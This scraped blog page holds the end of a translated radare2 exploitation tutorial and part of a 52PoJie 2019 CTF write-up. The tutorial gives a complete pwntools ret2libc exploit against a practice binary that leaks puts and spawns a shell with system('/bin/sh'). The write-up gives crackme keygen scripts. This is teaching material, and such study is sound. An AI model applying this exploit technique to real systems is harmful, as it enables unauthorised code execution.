Imports，让我们看看导入的函数。我们可以加上q来减少冗长的输出： 12345678910111213141516[0xf7763b30]&gt; ii[Imports]ordinal=001 plt=0x08048370 bind=GLOBAL type=FUNC name=strcmpordinal=002 plt=0x08048380 bind=GLOBAL type=FUNC name=strcpyordinal=003 plt=0x08048390 bind=GLOBAL type=FUNC name=putsordinal=004 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__ordinal=005 plt=0x080483a0 bind=GLOBAL type=FUNC name=__libc_start_mainordinal=006 plt=0x080483b0 bind=GLOBAL type=FUNC name=__isoc99_scanf6 imports[0xf7763b30]&gt; iiqstrcmpstrcpyputs__gmon_start____libc_start_main__isoc99_scanf 计划 泄漏puts的真实地址 计算libc的基址 计算system的地址 在libc中找到包含字符串/bin/sh的地址 调用system(&quot;/bin/sh&quot;)打开一个 shell 泄漏puts的地址我们需要用到ret2plt来泄漏puts的真实地址。PLT（Procedure Linkage Table）是内存中的结构体，它包括一小段代码，能够跳转到在动态链接时程序之外的函数地址。不管什么时候，我们在.text段看到CALL指令，并不是直接跳到函数。实际上，它跳转到了PLT中的一小段代码，像是func_name@plt这样。这一小段代码跳转到GOT（Global Offset Table）中的列出的该函数的地址。GOT表入口点会指回PLT，同时PLT会调用一个动态链接器来确定该函数的真实地址。下一次调用func_name@plt时，这段代码会直接跳转到GOT表里的函数地址。想要了解更多关于动态链接的知识，我推荐伊恩兰斯泰勒写的这一系列关于链接器的文章 为了达到这个目的，我们需要找到puts在PLT以及GOT中的地址，然后调用puts@plt并且把puts@got作为参数。我们将把这些调用连在一起，在scanf时传给程序。然后我们会返回到我们利用的第二个阶段。puts将会把它真实的地址输出出来。 12345678+---------------------+| Stage 1 |+---------------------+| padding (140 bytes) || puts@plt || entry_point || puts@got |+---------------------+ 编写脚本我们需要使用pwnlib框架，而且它是我最喜欢的 python 漏洞利用框架。他简化了很多东西，让利用更简便。当然你也可以使用其他你喜欢的方式。 使用pip下载pwntools： 12$ pip install --upgrade pip$ pip install --upgrade pwntools 你可以在官方文档上了解更多关于pwntools。 这是我们第一阶段的 python 脚本： 123456789101112131415161718192021222324252627282930313233343536from pwn import *# Addressesputs_plt =puts_got =entry_point =# context.log_level = \"debug\"def main(): # open process p = process(\"./megabeets_0x2\") # Stage 1 # Initial payload payload = \"A\"*140 # padding ropchain = p32(puts_plt) ropchain += p32(entry_point) ropchain += p32(puts_got) payload = payload + ropchain p.clean() p.sendline(payload) # Take 4 bytes of the output leak = p.recv(4) leak = u32(leak) log.info(\"puts is at: 0x%x\" % leak) p.clean()if __name__ == \"__main__\": main() 我们需要填充puts@plt和puts@got的地址，以及程序的入口点。让我们回到radare2并执行以下命令。字符#用于注释，字符~是radare2的 shell 中的内置grep。 123456789[0xf7763b30]&gt; # the address of puts@plt:[0xf7763b30]&gt; ?v sym.imp.puts0x08048390[0xf7763b30]&gt; # the address of puts@got:[0xf7763b30]&gt; ?v reloc.puts_200x0804a014[0xf7763b30]&gt; # the address of program’s entry point (entry0):[0xf7763b30]&gt; ieq0x080483d0 sym.imp.puts和reloc.puts_20是radare2自动检测到的标志。命令ie表示Information Entrypoint。 现在我们填入我们找到的地址： 12345678...# Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0... 我们执行一下脚本： 1234567891011121314$ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 23578[*] puts is at: 0xf75db710[*] Stopped process ‘./megabeets_0x2’ (pid 23578)$ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 23592[*] puts is at: 0xf7563710[*] Stopped process ‘./megabeets_0x2’ (pid 23592)$ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 23606[*] puts is at: 0xf75e3710[*] Stopped process ‘./megabeets_0x2’ (pid 23606) 我执行了脚本三次，puts的地址每次都会变得不一样。因此我们不能提前预测它的地址。现在我们需要找到puts在libc中的偏移，然后计算出libc的基址。在我们找到基址后，我们可以用偏移计算出system、exit以及字符串/bin/sh的地址。 现在我们的脚本应该是这样： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *# Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0# Offsetsoffset_puts =offset_system =offset_str_bin_sh =offset_exit =# context.log_level = \"debug\"def main(): # open process p = process(\"./megabeets_0x2\") # Stage 1 # Initial payload payload = \"A\"*140 ropchain = p32(puts_plt) ropchain += p32(entry_point) ropchain += p32(puts_got) payload = payload + ropchain p.clean() p.sendline(payload) # Take 4 bytes of the output leak = p.recv(4) leak = u32(leak) log.info(\"puts is at: 0x%x\" % leak) p.clean() # Calculate libc base libc_base = leak - offset_puts log.info(\"libc base: 0x%x\" % libc_base) # Stage 2 # Calculate offsets system_addr = libc_base + offset_system binsh_addr = libc_base + offset_str_bin_sh exit_addr = libc_base + offset_exit log.info(\"system: 0x%x\" % system_addr) log.info(\"binsh: 0x%x\" % binsh_addr) log.info(\"exit: 0x%x\" % exit_addr)if __name__ == \"__main__\": main() 计算真实地址请注意在文章的这部分，我的结果可能与你的不同。因为我们的 libc 版本不同，所以会产生不同的偏移。 首先我们需要找到puts在libc上的偏移。我们再一次打开radare2，继续执行到入口点。做以上步骤的原因是我们在libc载入之前开始调试程序，直到入口点时，运行库才全部加载完。 我们使用dmi命令，将libc和函数作为参数。我加上了~来显示相关的信息。 123456789101112131415161718192021$ r2 -d megabeets_0x2Process with PID 24124 started…= attach 24124 24124bin.baddr 0x08048000Using 0x8048000Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2asm.bits 32— A C program is like a fast dance on a newly waxed dance floor by people carrying razors – Waldi Ravens[0xf771ab30]&gt; dcu entry0Continue until 0x080483d0 using 1 bpsizehit breakpoint at: 80483d0[0x080483d0]&gt; dmi libc puts~ puts$vaddr=0xf758f710 paddr=0x00062710 ord=6490 fwd=NONE sz=474 bind=GLOBAL type=FUNC name=puts[0x080483d0]&gt; dmi libc system~ system$vaddr=0xf7569060 paddr=0x0003c060 ord=6717 fwd=NONE sz=55 bind=WEAK type=FUNC name=system[0x080483d0]&gt; dmi libc exit~ exit$vaddr=0xf755c180 paddr=0x0002f180 ord=5904 fwd=NONE sz=33 bind=LOCAL type=FUNC name=exit 请注意，在这篇文章发表前，dmi的输出格式就已经改变了。你的结果很有可能与我的有所不同。 所有这些paddr=0x000xxxxx是函数在libc上的偏移。现在我们需要在程序中找到/bin/sh的位置。我们将要使用radare2的一些搜索功能。radare2默认在dbg.map，也就是当前内存中查找。我们想要在所有内存中查找则需要设置成： 1[0x080483d0]&gt; e search.in = dbg.maps 你可以执行e search.in=?查看更多选项。执行Ve配置可视化模式 在radare2中通过/命令查找。让我们看看radare2给我们提供的查找参数： 123456789101112131415161718192021222324252627282930313233|Usage: /[amx/] [arg]Search stuff (see ‘e??search’ for options)| / foo\\x00 search for string ‘foo\\0’| /j foo\\x00 search for string ‘foo\\0’ (json output)| /! ff search for first occurrence not matching| /+ /bin/sh construct the string with chunks| /!x 00 inverse hexa search (find first byte != 0x00)| // repeat last search| /h[t] [hash] [len] find block matching this hash. See /#?| /a jmp eax assemble opcode and search its bytes| /A jmp find analyzed instructions of this type (/A? for help)| /b search backwards| /B search recognized RBin headers| /c jmp [esp] search for asm code| /C[ar] search for crypto materials| /d 101112 search for a deltified sequence of bytes| /e /E.F/i match regular expression| /E esil-expr offset matching given esil expressions %%= here| /f file [off] [sz] search contents of file with offset and size| /i foo search for string ‘foo’ ignoring case| /m magicfile search for matching magic file (use blocksize)| /o show offset of previous instruction| /p patternsize search for pattern of given size| /P patternsize search similar blocks| /r[e] sym.printf analyze opcode reference an offset (/re for esil)| /R [?] [grepopcode] search for matching ROP gadgets, semicolon-separated| /v[1248] value look for an cfg.bigendian 32bit value| /V[1248] min max look for an cfg.bigendian 32bit value in range| /w foo search for wide string ‘f\\0o\\0o\\0’| /wi foo search for wide string ignoring case ‘f\\0o\\0o\\0’| /x ff..33 search for hex string ignoring some nibbles| /x ff0033 search for hex string| /x ff43 ffd0 search for hexpair with mask| /z min max search for strings of given size 提供给我们了许多不同的方式。同时还发心/R能够帮助我们查找 ROP。可惜这篇文章里我们没有打算使用 ROP。但其他情况下，你们写利用脚本时一定很喜欢用它。 我们不需要任何花哨的东西，只用最简单的查找即可。在这之后，我们先找到当前libc载入的地址，然后计算出/bin/sh的偏移。 12345678910[0x080483d0]&gt; / /bin/shSearching 7 bytes from 0x08048000 to 0xffd50000: 2f 62 69 6e 2f 73 68Searching 7 bytes in [0x8048000-0x8049000]hits: 0Searching 7 bytes in [0x8049000-0x804a000]hits: 0 &lt;..truncated..&gt; Searching 7 bytes in [0xf77aa000-0xf77ab000]hits: 0Searching 7 bytes in [0xffd2f000-0xffd50000]hits: 00xf7700768 hit1_0 .b/strtod_l.c-c/bin/shexit 0canonica. r2在内存中找到了/bin/sh。现在我们计算它相对libc基址的偏移： 1234[0x080483d0]&gt; dmm~libc0xf7599000 /usr/lib32/libc-2.25.so[0x080483d0]&gt; ?X 0xf7700768-0xf7599000167768 我们发现/bin/sh相对libc基址的偏移为0x167768。我们把它填进脚本中，并且可以开始我们的最后一个步骤。 123456789...# Offsetsoffset_puts = 0x00062710offset_system = 0x0003c060offset_exit = 0x0002f1b0offset_str_bin_sh = 0x167768... 获取 shell漏洞利用的第二阶段很直接。我们继续使用 140 个字符，然后调用system并将/bin/sh作为参数，最后exit。 12345678+---------------------+| Stage 2 |+---------------------+| padding (140 bytes) || system@libc || exit@libc || /bin/sh address |+---------------------+ 还记得上一次我们返回到了入口点吗？这意味着scanf又在等待我们的输入。现在我们所做的就是把这些调用串联起来传给程序。 这是我们最后的脚本。像我之前所说的，你只需要替换符合你的libc的偏移。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import *# Addressesputs_plt = 0x8048390puts_got = 0x804a014entry_point = 0x80483d0# Offsetsoffset_puts = 0x00062710offset_system = 0x0003c060offset_exit = 0x0002f1b0offset_str_bin_sh = 0x167768# context.log_level = \"debug\"def main(): # open process p = process(\"./megabeets_0x2\") # Stage 1 # Initial payload payload = \"A\"*140 ropchain = p32(puts_plt) ropchain += p32(entry_point) ropchain += p32(puts_got) payload = payload + ropchain p.clean() p.sendline(payload) # Take 4 bytes of the output leak = p.recv(4) leak = u32(leak) log.info(\"puts is at: 0x%x\" % leak) p.clean() # Calculate libc base libc_base = leak - offset_puts log.info(\"libc base: 0x%x\" % libc_base) # Stage 2 # Calculate offsets system_addr = libc_base + offset_system exit_addr = libc_base + offset_exit binsh_addr = libc_base + offset_str_bin_sh log.info(\"system is at: 0x%x\" % system_addr) log.info(\"/bin/sh is at: 0x%x\" % binsh_addr) log.info(\"exit is at: 0x%x\" % exit_addr) # Build 2nd payload payload2 = \"A\"*140 ropchain2 = p32(system_addr) ropchain2 += p32(exit_addr) # Optional: Fix disallowed character by scanf by using p32(binsh_addr+5) # Then you'll execute system(\"sh\") ropchain2 += p32(binsh_addr) payload2 = payload2 + ropchain2 p.sendline(payload2) log.success(\"Here comes the shell!\") p.clean() p.interactive()if __name__ == \"__main__\": main() 跑这个脚本我们就能成功拿到一个 shell： 1234567891011121314$ python exploit.py[+] Starting local process ‘./megabeets_0x2’: pid 24410[*] puts is at: 0xf75db710[*] libc base: 0xf75ce000[*] system is at: 0xf760a060[*] /bin/sh is at: 0xf7735768[*] exit is at: 0xf75fd1b0[+] Here comes the shell![*] Switching to interactive mode:$ whoamibeet$ echo EOFEOF 后记Radare2之旅的第二部分就到此结束了。我们简单地学习了一些radare2中漏洞利用的功能。在下一部分中，我们会学习radare2再脚本编写和恶意软件分析中的功能。 漏洞利用命令对应表这是一系列我在本文中提到的命令（还有一些补充）。你可以把它作为一份参考表。 获取信息 $ rabin2 -I ./program——二进制信息（和radare2的 shell 中i命令相同） ii [q]——导入表 ?v sym.imp.func_name——获取func_name@PLT地址 ?v reloc.func_name——获取func_name@GOT地址 ie [q]——获取入口点地址 iS——查看区段的各个权限（读/写/执行） i~canary——检查是否开启Canary i~pic——检查是否开启PIE i~nx——检查是否开启NX 内存 dm——查看内存信息 dmm——列出模块（内存中的运行库和二进制模块） dmi [addr|libname] [symname]——列出目标库的标志 查找 e search.*——编辑查找配置 /?——列出查找的子命令 / string——在内存或程序段查找字符串 /R [?]——查找特定的 ROP /R/——ROP 常规搜索 调试 dc——继续执行 dcu addr——继续执行到某个地址 dcr——继续执行直到ret（单步步过） dbt [?]——在dbg.btdepth和dbg.btalgo的基础上回溯指令 doo [args]——重新打开调试并设置参数 ds——单步步入 dso——单步步过 图形模式 pdf @ addr——输出当前位移下函数的汇编代码 V——可视化模式，使用p/P再两个模式间切换 VV——图形模式，在 ascii 图像下分析 V!——控制板模式，对漏洞利用非常有用 看看这篇文章，也许有更多的内容能够帮助到你。","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"translation","slug":"translation","permalink":"qianfei11.coding.me/tags/translation/"}]},{"title":"2019春节-吾爱破解解题领红包活动","slug":"2019春节-吾爱破解解题领红包活动","date":"2019-02-21T12:33:03.000Z","updated":"2020-02-02T11:49:09.992Z","comments":true,"path":"2019/02/21/2019春节-吾爱破解解题领红包活动/","link":"","permalink":"qianfei11.coding.me/2019/02/21/2019春节-吾爱破解解题领红包活动/","excerpt":"做了点简单的题目。","text":"做了点简单的题目。 【春节】解题领红包之一扫码关注即可。 【春节】解题领红包之二查壳是 upx，ESP 定律法找到 OEP 脱壳。然后放进 ida 里： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647HWND main_func()&#123; HWND result; // eax char *input; // esi char *key; // edi int enc_1; // [esp+0h] [ebp-14h] int enc_2; // [esp+4h] [ebp-10h] int enc_3; // [esp+8h] [ebp-Ch] int enc_4; // [esp+Ch] [ebp-8h] char v7; // [esp+10h] [ebp-4h] result = GetDlgItem(0, 1000); if ( result ) &#123; if ( GetWindowTextLengthA(result) == 16 ) &#123; input = (char *)malloc(0x11u); key = (char *)malloc(0x11u); *(_DWORD *)input = 0; *((_DWORD *)input + 1) = 0; *((_DWORD *)input + 2) = 0; *((_DWORD *)input + 3) = 0; input[16] = 0; *(_DWORD *)key = 0; *((_DWORD *)key + 1) = 0; *((_DWORD *)key + 2) = 0; *((_DWORD *)key + 3) = 0; key[16] = 0; GetDlgItemTextA(0, 1000, input, 17); enc_3 = 'udhY'; enc_1 = 'ssdH'; enc_2 = 'zhNb'; enc_4 = '9102'; v7 = 0; encrypt((const char *)&amp;enc_1, (int)key, 3); if ( !strcmp(key, input) ) result = (HWND)MessageBoxA(0, aOye, Caption, 0); else result = (HWND)MessageBoxA(0, aAuey, Caption, 0); &#125; else &#123; result = (HWND)MessageBoxA(0, &amp;Text, Caption, 0); &#125; &#125; return result;&#125; 看下来应该就是把 16 位的enc加密了一下，然后和input比较。看看encrypt()函数： 123456789101112131415161718192021222324252627282930313233343536373839404142signed int __cdecl encrypt(const char *enc, int key, int num_3)&#123; const char *enc_0; // edx unsigned int length; // kr04_4 int v5; // esi int i; // edi char c; // al char alphabet[29]; // [esp+Bh] [ebp-1Dh] char tmp; // [esp+30h] [ebp+8h] strcpy(&amp;alphabet[1], \"abcdefghijklmnopqrstuvwxyz\"); if ( !key ) return -1; enc_0 = enc; if ( !enc ) return -1; if ( num_3 &lt;= 0 ) return -1; length = strlen(enc) + 1; if ( (signed int)(length - 1) &lt;= 0 ) return -1; v5 = key - (_DWORD)enc; tmp = alphabet[num_3 + 1]; i = length - 1; do &#123; c = *enc_0; if ( *enc_0 &lt; tmp || c &gt; 122 ) &#123; if ( c &gt;= 97 &amp;&amp; c &lt;= alphabet[num_3] ) c = c - num_3 + 26; &#125; else &#123; c -= num_3; &#125; (enc_0++)[v5] = c; --i; &#125; while ( i ); return 0;&#125; 就是对字符串判断是否为字母，然后根据字母表alphabet做映射和加减。正向实现一下脚本就得到口令了： 1234567891011121314151617181920212223#!/usr/bin/env pythonenc = ('9102' + 'udhY' + 'zhNb' + 'ssdH')[::-1]print encalpha = 'abcdefghijklmnopqrstuvwxyz'num = 3t = alpha[num + 1]i = len(enc)j = 0res = ''while i != 0: c = enc[j] if ord(c) &lt; ord(t) or ord(c) &gt; 122: if ord(c) &gt;= 97 and ord(c) &lt;= ord(alpha[num]): c = chr(ord(c) - num + 26) if ord(c) &gt; ord(alpha[-1]): c = chr(ord(c) - 26) else: c = chr(ord(c) - num) res += c j += 1 i -= 1print res# HappyNewYear2019 【春节】解题领红包之三这道题我查了壳然后不会脱就一直没做。看了writeup居然是直接进 ida 就分析了。搜索到 main 函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156int main_main()&#123; int v0; // ST04_4 _DWORD *v1; // ST04_4 _DWORD *v2; // ST04_4 int v3; // ST04_4 _DWORD *v4; // ST04_4 int v5; // ST10_4 int v6; // ST14_4 int base64_check; // ST18_4 int v8; // ST04_4 int result; // eax char v10; // ST0C_1 int v11; // [esp+0h] [ebp-7Ch] int v12; // [esp+4h] [ebp-78h] int v13; // [esp+4h] [ebp-78h] int v14; // [esp+8h] [ebp-74h] int v15; // [esp+Ch] [ebp-70h] int v16; // [esp+Ch] [ebp-70h] int v17; // [esp+Ch] [ebp-70h] char v18; // [esp+Ch] [ebp-70h] int v19; // [esp+10h] [ebp-6Ch] int v20; // [esp+10h] [ebp-6Ch] int v21; // [esp+10h] [ebp-6Ch] int v22; // [esp+14h] [ebp-68h] int v23; // [esp+14h] [ebp-68h] int v24; // [esp+14h] [ebp-68h] int v25; // [esp+14h] [ebp-68h] unsigned int v26; // [esp+18h] [ebp-64h] int v27; // [esp+18h] [ebp-64h] int v28; // [esp+1Ch] [ebp-60h] int v29; // [esp+1Ch] [ebp-60h] int v30; // [esp+20h] [ebp-5Ch] int aes_check; // [esp+24h] [ebp-58h] int v32; // [esp+28h] [ebp-54h] int v33; // [esp+2Ch] [ebp-50h] int v34; // [esp+2Ch] [ebp-50h] _DWORD *v35; // [esp+30h] [ebp-4Ch] _DWORD *v36; // [esp+34h] [ebp-48h] _DWORD *v37; // [esp+38h] [ebp-44h] int *v38; // [esp+3Ch] [ebp-40h] int v39; // [esp+40h] [ebp-3Ch] int *v40; // [esp+44h] [ebp-38h] void *v41; // [esp+48h] [ebp-34h] int *v42; // [esp+4Ch] [ebp-30h] void *v43; // [esp+50h] [ebp-2Ch] int *key; // [esp+54h] [ebp-28h] _DWORD *v45; // [esp+58h] [ebp-24h] int *v46; // [esp+5Ch] [ebp-20h] void *v47; // [esp+60h] [ebp-1Ch] int *uid; // [esp+64h] [ebp-18h] _DWORD *v49; // [esp+68h] [ebp-14h] int *v50; // [esp+6Ch] [ebp-10h] void *v51; // [esp+70h] [ebp-Ch] int *v52; // [esp+74h] [ebp-8h] void *v53; // [esp+78h] [ebp-4h] void *retaddr; // [esp+7Ch] [ebp+0h] if ( (unsigned int)&amp;retaddr &lt;= *(_DWORD *)(*(_DWORD *)__readfsdword(0x14u) + 8) ) runtime_morestack_noctxt(); v52 = dword_4A04E0; v53 = &amp;main_statictmp_0; fmt_Println(&amp;v52, 1, 1); runtime_newobject(dword_4A04E0, v0); v36 = v1; runtime_newobject(dword_4A04E0, v1); v37 = v2; v50 = dword_4A04E0; v51 = &amp;main_statictmp_1; fmt_Print(&amp;v50, 1, 1); uid = dword_498EE0; v49 = v36; fmt_Scanln(&amp;uid, 1, 1); // input uid v46 = dword_4A04E0; v47 = &amp;main_statictmp_2; fmt_Print(&amp;v46, 1, 1); key = dword_498EE0; v45 = v37; fmt_Scanln(&amp;key, 1, 1); // input key runtime_newobject(dword_4A90C0, v3); v35 = v4; *v4 = 0x67452301; v4[1] = 0xEFCDAB89; v4[2] = 0x98BADCFE; v4[3] = 0x10325476; v4[4] = 0xC3D2E1F0; v4[21] = 0; v4[22] = 0; v4[23] = 0; runtime_stringtoslicebyte(0, *v36, v36[1]); crypto_sha1___digest__Write(v35, v15, v19, v22, v19, v22); crypto_sha1___digest__Sum(v35, 0, 0, 0, v5, v6);// get uid's sha1 digest if ( v26 &lt; 0x10 ) runtime_panicslice( v11, v12, v14, v16, v20, v23, v26, v28, v30, aes_check, v32, v33, v35, v36, v37, v38, v39, v40, v41, v42, v43, key, v45, v46, v47, uid, v49, v50, v51, v52, v53); v34 = v20; encoding_base64___Encoding__DecodeString(encoding_base64_StdEncoding, *v37, v37[1], v16, v20, v23, v26); if ( base64_check ) &#123; v42 = dword_4A04E0; v43 = &amp;main_statictmp_3; result = fmt_Println(&amp;v42, 1, 1); &#125; else &#123; main_AesDecrypt(v17, v21, v24, v34, 16, 16, 0, v28); if ( aes_check ) &#123; v40 = dword_4A04E0; v41 = &amp;main_statictmp_4; result = fmt_Println(&amp;v40, 1, 1); &#125; else &#123; if ( v29 == 26 &amp;&amp; (runtime_memequal(v27, MEMORY[0x4B8A80], 26, v18), v10) ) fmt_Printf(aSuccess, 73, 0, 0, 0, v25, v27, 26); else fmt_Printf(&amp;aFailed, 24, 0, 0, 0, v25, v27, v29); runtime_newobject(dword_4A04E0, v13); v38 = dword_498EE0; v39 = v8; result = fmt_Scanln(&amp;v38, 1, 1); &#125; &#125; return result;&#125; 大概看了一遍之后，可以推测，先分别输入 uid 和 key，然后先进行 base64 解密（如果解密失败则报错），然后用 uid 的 sha1 摘要作为 key 来进行 aes 解密（如果解密失败则报错），最后和数据段中一串长度为 26 的字符串比较。具体字符串我们可以 dump 出来： 123456data = [0x48, 0x61, 0x70, 0x70, 0x79, 0x4E, 0x65, 0x77, 0x59, 0x65, 0x61, 0x72, 0x46, 0x72, 0x6F, 0x6D, 0x35, 0x32, 0x50, 0x6F, 0x4A, 0x69, 0x65, 0x2E, 0x43, 0x6E, 0x4C, 0x69, 0x6E, 0x65, 0x20, 0x49, 0x73, 0x6C, 0x61, 0x6E, 0x64, 0x73, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x20, 0x54, 0x69, 0x6D, 0x65, 0x4E, 0x65, 0x77, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x6C, 0x61, 0x6E, 0x64, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x20, 0x54, 0x69]output = ''for i in range(26): output += chr(data[i])print output# HappyNewYearFrom52PoJie.Cn 可以使用 IDA 进行动态调试来验证 AES 的密钥。先输入 uid 和一个可以被成功解码的 base64 字符串，然后在 AES 函数中设下断点，可以看到密钥即为 uid 的 sha1 摘要： 调试中可以从内存里 dump 得到 3f2481363378f23964b9977ab8bad974de108eee 其实这一串数据就是 uid 对应的 sha1 散列值，取前 16 位作为 AES 的密钥。 AES 加密方式为 CBC （main_AesDecrypt() 函数中可以直接看出），补码方式为 PKCS5Padding（AES 解密错误时，会退出程序，但是有异常信息一闪而过，给报错函数下断点即可查看异常信息）。只需要把密钥转化成字节数组，使用 AES/CBC/PKCS5Padding 方式加密 HappyNewYearFrom52PoJie.Cn，最后进行 base64 加密就可得到口令。go 语言实现代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package mainimport ( \"fmt\" \"bytes\" \"crypto/cipher\" \"crypto/sha1\" \"crypto/aes\" \"encoding/base64\")func PKCS5Padding(ciphertext []byte, blockSize int) []byte &#123; padding := blockSize - len(ciphertext)%blockSize padtext := bytes.Repeat([]byte&#123;byte(padding)&#125;, padding) return append(ciphertext, padtext...)&#125;func PKCS5UnPadding(origData []byte) []byte &#123; length := len(origData) unpadding := int(origData[length-1]) return origData[:(length - unpadding)]&#125;func AesEncrypt(origData, key []byte) ([]byte, error) &#123; block, err := aes.NewCipher(key) if err != nil &#123; return nil, err &#125; blockSize := block.BlockSize() origData = PKCS5Padding(origData, blockSize) blockMode := cipher.NewCBCEncrypter(block, key[:blockSize]) crypted := make([]byte, len(origData)) blockMode.CryptBlocks(crypted, origData) return crypted, nil&#125;func AesDecrypt(crypted, key []byte) ([]byte, error) &#123; block, err := aes.NewCipher(key) if err != nil &#123; return nil, err &#125; blockSize := block.BlockSize() blockMode := cipher.NewCBCDecrypter(block, key[:blockSize]) origData := make([]byte, len(crypted)) blockMode.CryptBlocks(origData, crypted) origData = PKCS5UnPadding(origData) return origData, nil&#125;func main() &#123; uid := \"975446\" h := sha1.New() h.Write([]byte(uid)) bs := h.Sum(nil) var aeskey = bs[0:16] fmt.Println(\"AES Key: \", aeskey) pass := []byte(\"HappyNewYearFrom52PoJie.Cn\") xpass, err := AesEncrypt(pass, aeskey) if err != nil &#123; fmt.Println(err) return &#125; pass64 := base64.StdEncoding.EncodeToString(xpass) fmt.Printf(\"Ciphertext: %v\\n\",pass64) bytesPass, err := base64.StdEncoding.DecodeString(pass64) if err != nil &#123; fmt.Println(err) return &#125; tpass, err := AesDecrypt(bytesPass, aeskey) if err != nil &#123; fmt.Println(err) return &#125; fmt.Printf(\"Plaintext: %s\\n\", tpass)&#125; 【春节】解题领红包之番外篇番外篇个人感觉应该算是一道 ctf 里的 misc 题了。压缩包里给了一个大部分文字被加密的 md 文件： 12345678910111213# ȐĆŅƃȓƇńƃȒċƝÞɌÇńßɌĉŇƅŕƇŃbȒȼȵßȒĆȵƁȓĉnƁɌćǸßƦćƝƁȓĉnƅȓčƞÞɌćÑbȒČŃbȒċÑbŕƇŃþȒČNƃȒĈÑƄȓĊÑƄŕƇņÞȓčƞÞɌćÑbȒċƝÞŘcǸÞȐĆŅBƦĊȵþřÇȵƅȐċŇbɌcńþȓČŇƁŕƇNƀȒČŃBɌćÑBɌċnƄȓĈƝbŗƇƞÞŗčnBŕƇnþȒȻŃBȓĉnƅȒČNƅȒƈŇþŕčȠßŕƇŃƃřčȠbřċȵƀȐčNƄŕƇņƃɌcŅƄɌċnþŕƇŇƁȓƇńƁŕƇńþɌcńƄŕƇńþɌCňƀƦȻƝƃŕƇńþɌCňƀȐĉņþŗcŅƅȒĈÑƄȓĊǸƅȓĈȵþɌćƞßŕƇņÞȒȻŃþɌCňƀɌćǸbȒȼǹßȓĈƝB[ƦĉņƃŖċŅþŕƇŅƀȒCŅƀȒƈŇþɌcŅƄɌĉŇßŕƇņÞȓčƞÞȒƈňþŕƇńþȓĉnþȓČŇBŗcŅƅɌćƞƁȓćŅƁŕƇņÞȒȻŃþɌCňƁ](//rcnb.xyz)řĊÑbȒĉȠƀɌćÑbȒċƝÞȓćŅƁɌƈȠƃŕƇŃþȒȻŃþȒĈƞÞȑÇǹƄɌCȠƄƦȻŇƅɌćƞBȐčnÞŗÇÑBřĊÑbɌĆnþŗÇǹbȐȼŃßɌćÑbŕƇņÞȒȻŃƄŕƇņÞɌcńþȒCŅbŕȻŘĈÑƀƝƄŘȻŖĊǸƀrcnƃňßɍĉƞƀRČņbRÇrcnbrcnbrcnbŖĊƝƃrcnbrcnbrcnbrČNþȓĉƞƁnƅŔƇńÞrćǹƁȓĆÑƅŔȼŕÇƞƅƞßȐCŅƁȐƇŖĆňƁɌƇȵƃȑĈȠƃNƃƦčƝƄȓĉŕČňƃŇbȐĆȑćnƅŘȼȵßƞßRĆǸƄɌCƞBȑĊŅÞŗĊɌȼŃßŇƁŔcŔƈǹÞȠƁɌĆńƅɍĉƝÞŖÇɌcŇƅŖĆnþńƁȓČňƄŘȻȓȻnƃǸƁɌCȒćȵƁȵƄɌCŅƅȐčŃƀřCřƇŇƁǸþřÇƞbƦČnbRCƝßȐćǹƁŔȻřȻņBǹBȑċŗÇƞƃȠBɌĆÑƃŕčņƃȓƇńbŖčÑbɌĊŗƈÑBRcƞƁȑƇńÞƦČǹƀǸƀŘcŘȻnƅRCņƃŅƄȐĉNÞŘĈÑƄŕčȐćǹbŇÞȓćǹßɌĈŔȻňƀƝbȐÇrCǹÞȓȻŃBńƄɍċńbɌČŗƇnƅȵƀŗċņßRCŇbřČřćÑƀȐĊŃbǸƅɍcȑCȵbǸßȑƇȑCǹƅŘȻŃƃřċŃþnƄRċǹBrƇńƃŖĈȑĉņbƞƅƦĆrCƝÞƦĆÑBņƄrćȑƇÑƅńƄƦƇŗĆnƀŔĆȠƄȐćNƀÑƅƦȼȓĉŇƄȵßȑCǹƄȐȼŗćȠƃŅBȓCȠƁŔċƝßřcŘčŅbƦĊƝƃɌċƞƀnƁŘȻÑbŖčŗCnþȒȻÑƅNþřȼrƈNƁŕĆƝBȐÇňƅȐCŃßŅƄrćƞƀȓĊńƃŖƇǸƁřċŘćŃƁŘȼÑƅȑċȵƀŃþrƇŃßŕĉrćNþȒȻƝƁɌƈȠbƦĊNƅŔCƝßȓČńÞƦċŇbŖƈņƃŖĉȵþnƃɍĉɌƈňÞřčǹBȠbŕĉřċńþņƄȑÇƞƁȒcŘĉǸƅňƃȒcŔĈńßǹƁƦćȓȼǹƁÑƁƦCȑċŇƄȓƈnƄȵƄrcŘčnƃȵßRčȑcNƁrĊNƅȐÇŇƁņƁȒčnƀɌČňbɌĆrȼƞÞŇƃɌCřÇnþňƅȒȼƝBȑcȐȻnBňƁȑċȓcȠbǹþȑƇǹƁrĈŖƈňƁŗcȵbňþřȼƦĈŃƅňßŗcŃƀƦĊŔcńÞŖĉȠƅŃƁȑĊȐÇȠþƞÞɌƇȵƅȐȼɍĉÑBrƇŇƅŔčƞßnƅŗĈɍĆȵƅŖČņbŖĆȠÞȒċÑƃŗċNƃŕȻŃÞNÞŔčŕĆƞƃNƃRČȐĆņƁŃƀřċŃbȓčƝƃȑcŔĆNþȑčȠbŗĆNþŇƁȓčrčŃƄȑĉnþŅþȓȻřcÑƄŖƇÑßȐĆńbŅb